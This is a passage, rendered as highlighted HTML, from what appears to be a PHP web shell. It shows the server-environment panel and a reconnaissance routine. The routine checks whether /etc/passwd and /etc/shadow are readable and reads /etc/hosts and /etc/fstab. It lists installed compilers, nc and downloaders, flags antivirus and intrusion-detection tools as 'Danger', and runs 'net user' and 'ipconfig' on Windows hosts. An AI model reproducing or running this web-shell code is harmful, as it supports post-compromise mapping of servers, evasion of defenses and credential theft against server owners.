<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   11 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'PHPINFO'</span>,(<span style="color: #81a2be;">IS_PHPINFO</span> ? <span style="color: #8abeb7;">'&lt;a href="javascript:g(\'phpinfo\');</span><span style="color: #8abeb7; text-decoration: underline;">"&gt;Yes&lt;/a&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">'No'</span><span style="text-decoration: underline;">)),</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   12 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'Safe Mode'</span>,getcfg(<span style="color: #8abeb7;">'safe_mode'</span>)),
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   13 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'Administrator'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">adminmail</span>),
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   14 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'allow_url_fopen'</span>,getcfg(<span style="color: #8abeb7;">'allow_url_fopen'</span>)),
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   15 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'enable_dl'</span>,getcfg(<span style="color: #8abeb7;">'enable_dl'</span>)),
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   16 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'display_errors'</span>,getcfg(<span style="color: #8abeb7;">'display_errors'</span>)),
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   17 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'register_globals'</span>,getcfg(<span style="color: #8abeb7;">'register_globals'</span>)),
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   18 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'magic_quotes_gpc'</span>,getcfg(<span style="color: #8abeb7;">'magic_quotes_gpc'</span>)),
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   19 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'memory_limit'</span>,getcfg(<span style="color: #8abeb7;">'memory_limit'</span>)),
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   20 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'post_max_size'</span>,getcfg(<span style="color: #8abeb7;">'post_max_size'</span>)),
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   21 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'upload_max_filesize'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">upsize</span>),
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   22 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'max_execution_time'</span>,getcfg(<span style="color: #8abeb7;">'max_execution_time'</span>).<span style="color: #8abeb7;">' second(s</span><span style="color: #8abeb7; text-decoration: underline;">)'</span><span style="text-decoration: underline;">),</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   23 =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'disable_functions'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dis_func</span>),
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   );

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">phpvarname</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">phpvarname</span> .<span style="color: #8abeb7;">' : '</span>.getcfg(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">phpvarname</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formhead(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Server environment'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'phpenv'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Please input PHP configuration parameter(eg:magic_</span><span style="color: #8abeb7; text-decoration: underline;">quotes_gpc)'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'name'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #8abeb7; text-decoration: underline;">'phpvarname'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'value'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">phpvarname</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;1));</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formfooter();

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">hp</span> = <span style="color: #b5bd68;">array</span>(0=&gt; <span style="color: #8abeb7;">'Server'</span>, 1=&gt; <span style="color: #8abeb7;">'PHP'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">a</span>=0;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">a</span>&lt;2;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">a</span>++) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;h2&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">hp</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">a</span>].<span style="color: #8abeb7;">' &amp;raquo;&lt;/h2&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;ul class="info"&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">a</span>==0) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>=1;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>&lt;=9;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>++) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;li&gt;&lt;u&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">info</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>][0].<span style="color: #8abeb7;">':&lt;/u&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">info</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>][1].<span style="color: #8abeb7;">'&lt;/li&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">a</span> == 1) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>=10;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>&lt;=23;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>++) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;li&gt;&lt;u&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">info</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>][0].<span style="color: #8abeb7;">':&lt;/u&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">info</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">i</span>][1].<span style="color: #8abeb7;">'&lt;/li&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/ul&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end phpenv</span>

<span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'secinfo'</span>) {

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   secparam(<span style="color: #8abeb7;">'Server software'</span>, <span style="color: #81a2be;">@getenv</span>(<span style="color: #8abeb7;">'SERVER_SOFTWARE'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   secparam(<span style="color: #8abeb7;">'Disabled PHP Functions'</span>, (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">GLOBALS</span>[<span style="color: #8abeb7;">'disable_functions'</span>])?<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">GLOBALS</span>[<span style="color: #8abeb7; text-decoration: underline;">'disable_functions'</span><span style="text-decoration: underline;">]:</span><span style="color: #8abeb7; text-decoration: underline;">'none'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   secparam(<span style="color: #8abeb7;">'Open base dir'</span>, @ini_get(<span style="color: #8abeb7;">'open_basedir'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   secparam(<span style="color: #8abeb7;">'Safe mode exec dir'</span>, @ini_get(<span style="color: #8abeb7;">'safe_mode_exec_dir'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   secparam(<span style="color: #8abeb7;">'Safe mode include dir'</span>, @ini_get(<span style="color: #8abeb7;">'safe_mode_include_dir'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   secparam(<span style="color: #8abeb7;">'cURL support'</span>, function_exists(<span style="color: #8abeb7;">'curl_version'</span>)?<span style="color: #8abeb7;">'enabled'</span>:<span style="color: #8abeb7;">'no'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">temp</span>=<span style="color: #b5bd68;">array</span>();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(function_exists(<span style="color: #8abeb7;">'mysql_get_client_info'</span>))
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">temp</span>[] = <span style="color: #8abeb7;">"MySql ("</span>.mysql_get_client_info().<span style="color: #8abeb7;">")"</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(function_exists(<span style="color: #8abeb7;">'mssql_connect'</span>))
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">temp</span>[] = <span style="color: #8abeb7;">"MSSQL"</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(function_exists(<span style="color: #8abeb7;">'pg_connect'</span>))
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">temp</span>[] = <span style="color: #8abeb7;">"PostgreSQL"</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(function_exists(<span style="color: #8abeb7;">'oci_connect'</span>))
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">temp</span>[] = <span style="color: #8abeb7;">"Oracle"</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   secparam(<span style="color: #8abeb7;">'Supported databases'</span>, implode(<span style="color: #8abeb7;">', '</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">temp</span>));

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>( <span style="color: #81a2be;">!</span><span style="color: #81a2be;">IS_WIN</span> ) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">userful</span> = <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'gcc'</span>,<span style="color: #8abeb7;">'lcc'</span>,<span style="color: #8abeb7;">'cc'</span>,<span style="color: #8abeb7;">'ld'</span>,<span style="color: #8abeb7;">'make'</span>,<span style="color: #8abeb7;">'php'</span>,<span style="color: #8abeb7;">'perl'</span>,<span style="color: #8abeb7;">'python'</span>,<span style="color: #8abeb7;">'rub</span><span style="color: #8abeb7; text-decoration: underline;">y'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'tar'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'gzip'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'bzip'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'bzip2'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'nc'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'locate'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'suidperl'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">danger</span> = <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'kav'</span>,<span style="color: #8abeb7;">'nod32'</span>,<span style="color: #8abeb7;">'bdcored'</span>,<span style="color: #8abeb7;">'uvscan'</span>,<span style="color: #8abeb7;">'sav'</span>,<span style="color: #8abeb7;">'drwebd'</span>,<span style="color: #8abeb7;">'clamd'</span>,<span style="color: #8abeb7; text-decoration: underline;">'rkhunter'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'chkrootkit'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'iptables'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'ipfw'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'tripwire'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'shieldcc'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'portsentry'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'snort'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'ossec'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'lidsadm'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'tcplodg'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'sxid'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'logcheck'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'logwatch'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'sysmask'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'zmbscap'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'sawmill'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'wormscan'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'ninja'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">downloaders</span> = <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'wget'</span>,<span style="color: #8abeb7;">'fetch'</span>,<span style="color: #8abeb7;">'lynx'</span>,<span style="color: #8abeb7;">'links'</span>,<span style="color: #8abeb7;">'curl'</span>,<span style="color: #8abeb7;">'get'</span>,<span style="color: #8abeb7;">'lwp-mir</span><span style="color: #8abeb7; text-decoration: underline;">ror'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   secparam(<span style="color: #8abeb7;">'Readable /etc/passwd'</span>, @is_readable(<span style="color: #8abeb7;">'/etc/passwd'</span>) ? <span style="color: #8abeb7;">"yes"</span> : <span style="color: #8abeb7;">'</span><span style="color: #8abeb7; text-decoration: underline;">no'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   secparam(<span style="color: #8abeb7;">'Readable /etc/shadow'</span>, @is_readable(<span style="color: #8abeb7;">'/etc/shadow'</span>) ? <span style="color: #8abeb7;">"yes"</span> : <span style="color: #8abeb7;">'</span><span style="color: #8abeb7; text-decoration: underline;">no'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   secparam(<span style="color: #8abeb7;">'OS version'</span>, @file_get_contents(<span style="color: #8abeb7;">'/proc/version'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   secparam(<span style="color: #8abeb7;">'Distr name'</span>, @file_get_contents(<span style="color: #8abeb7;">'/etc/issue.net'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">safe_mode</span> = @ini_get(<span style="color: #8abeb7;">'safe_mode'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">GLOBALS</span>[<span style="color: #8abeb7;">'safe_mode'</span>]) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">temp</span>=<span style="color: #b5bd68;">array</span>();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">userful</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">item</span>)
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(which(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">item</span>)){<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">temp</span>[]=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">item</span>;}
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   secparam(<span style="color: #8abeb7;">'Userful'</span>, implode(<span style="color: #8abeb7;">', '</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">temp</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">temp</span>=<span style="color: #b5bd68;">array</span>();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">danger</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">item</span>)
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(which(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">item</span>)){<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">temp</span>[]=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">item</span>;}
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   secparam(<span style="color: #8abeb7;">'Danger'</span>, implode(<span style="color: #8abeb7;">', '</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">temp</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">temp</span>=<span style="color: #b5bd68;">array</span>();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">downloaders</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">item</span>)<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(which(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">item</span>)){<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">temp</span>[]=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">item</span>;}
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   secparam(<span style="color: #8abeb7;">'Downloaders'</span>, implode(<span style="color: #8abeb7;">', '</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">temp</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   secparam(<span style="color: #8abeb7;">'Hosts'</span>, @file_get_contents(<span style="color: #8abeb7;">'/etc/hosts'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   secparam(<span style="color: #8abeb7;">'HDD space'</span>, execute(<span style="color: #8abeb7;">'df -h'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   secparam(<span style="color: #8abeb7;">'Mount options'</span>, @file_get_contents(<span style="color: #8abeb7;">'/etc/fstab'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   secparam(<span style="color: #8abeb7;">'OS Version'</span>,execute(<span style="color: #8abeb7;">'ver'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   secparam(<span style="color: #8abeb7;">'Account Settings'</span>,execute(<span style="color: #8abeb7;">'net accounts'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   secparam(<span style="color: #8abeb7;">'User Accounts'</span>,execute(<span style="color: #8abeb7;">'net user'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   secparam(<span style="color: #8abeb7;">'IP Configurate'</span>,execute(<span style="color: #8abeb7;">'ipconfig -all'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end</span>

<span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(<span style="color: #8abeb7;">'Undefined Action'</span>);
}

<span style="color: #b294bb;">?&gt;</span>
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
